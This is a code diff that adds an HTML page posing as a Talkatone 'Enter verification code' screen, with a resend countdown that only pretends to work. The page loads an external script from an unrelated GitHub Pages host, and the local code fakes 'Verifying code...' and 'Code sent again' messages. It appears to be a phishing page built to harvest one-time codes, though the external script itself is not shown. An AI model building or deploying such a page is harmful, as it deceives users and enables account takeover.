@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Receive Code talkatone</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+
+body{
+  min-height:100vh;
+  background: linear-gradient(135deg, #5f5f5f, #2e2e2e);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#fff;
+}
+
+.container{
+  width:92%;
+  max-width:380px;
+}
+
+.title{
+  font-size:22px;
+  margin-bottom:6px;
+}
+
+.subtitle{
+  font-size:14px;
+  color:#ddd;
+  margin-bottom:20px;
+}
+
+/* input */
+.input-box{
+  border-bottom:1px solid #aaa;
+  margin-bottom:20px;
+}
+
+input{
+  width:100%;
+  background:none;
+  border:none;
+  outline:none;
+  color:#fff;
+  padding:10px 0;
+  font-size:16px;
+}
+
+/* buttons */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:4px;
+  font-size:16px;
+  background:#bfbfbf;
+  color:#6d9fd6;
+  cursor:not-allowed;
+}
+
+button.active{
+  background:#d9d9d9;
+  color:#1da1f2;
+  cursor:pointer;
+}
+
+/* resend */
+.resend-wrap{
+  margin-top:15px;
+  font-size:13px;
+  color:#ddd;
+}
+
+.resend-btn{
+  display:inline-block;
+  margin-top:6px;
+  font-size:14px;
+  text-decoration:underline;
+  cursor:pointer;
+}
+
+.resend-btn.disabled{
+  opacity:0.4;
+  cursor:not-allowed;
+  text-decoration:none;
+}
+.status{
+  margin-top:8px;
+  font-size:12px;
+  color:#ccc;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="container">
+  <div class="title">Enter verification code</div>
+  <div class="subtitle">We sent a code to your email or phone.</div>
+<form>
+  <form id="codeForm">
+    <div class="input-box">
+      <input type="text" id="codeInput" name="code" placeholder="ENTER CODE" name="Receive code">
+    </div>
+
+    <button id="verifyBtn" type="submit" disabled type="submit">VERIFY</button>
+</form>
+    <div class="resend-wrap">
+      <div id="timerText">Resend code in 30s</div>
+      <span id="resendBtn" class="resend-btn disabled">Resend code</span>
+      <div id="statusMsg" class="status"></div>
+    </div>
+  </form>
+</div>
+
+<script>
+const codeInput  = document.getElementById("codeInput");
+const verifyBtn  = document.getElementById("verifyBtn");
+const resendBtn  = document.getElementById("resendBtn");
+const timerText  = document.getElementById("timerText");
+const statusMsg  = document.getElementById("statusMsg");
+
+let baseDelay = 30;     // first wait
+let extraDelay = 0;     // added each resend
+let remaining = baseDelay;
+let timerId = null;
+
+// enable / disable verify button
+codeInput.addEventListener("input", ()=>{
+  if(codeInput.value.trim() !== ""){
+    verifyBtn.disabled = false;
+    verifyBtn.classList.add("active");
+  }else{
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove("active");
+  }
+});
+
+// prevent real submit (remove if you want real backend submit)
+document.getElementById("codeForm").addEventListener("submit", (e)=>{
+  e.preventDefault();
+  statusMsg.textContent = "Verifying code...";
+});
+
+// start first countdown immediately
+startTimer(baseDelay);
+
+// handle resend click
+resendBtn.addEventListener("click", ()=>{
+  if(resendBtn.classList.contains("disabled")) return;
+
+  // simulate sending code (no alert)
+  statusMsg.textContent = "Code sent again.";
+
+  // increase delay by +30 seconds each time
+  extraDelay += 30;
+  const nextDelay = baseDelay + extraDelay;
+
+  startTimer(nextDelay);
+});
+
+// function to start / restart timer
+function startTimer(seconds){
+  if(timerId) clearInterval(timerId);
+
+  remaining = seconds;
+  setResendDisabled(true);
+  updateTimerText();
+
+  timerId = setInterval(()=>{
+    remaining--;
+    updateTimerText();
+
+    if(remaining <= 0){
+      clearInterval(timerId);
+      timerId = null;
+      timerText.textContent = "You can resend a new code.";
+      setResendDisabled(false);
+    }
+  }, 1000);
+}
+
+function updateTimerText(){
+  timerText.textContent = "Resend code in " + remaining + "s";
+}
+
+function setResendDisabled(state){
+  if(state){
+    resendBtn.classList.add("disabled");
+  }else{
+    resendBtn.classList.remove("disabled");
+  }
+}
+</script>
+
+</body>
+</html>
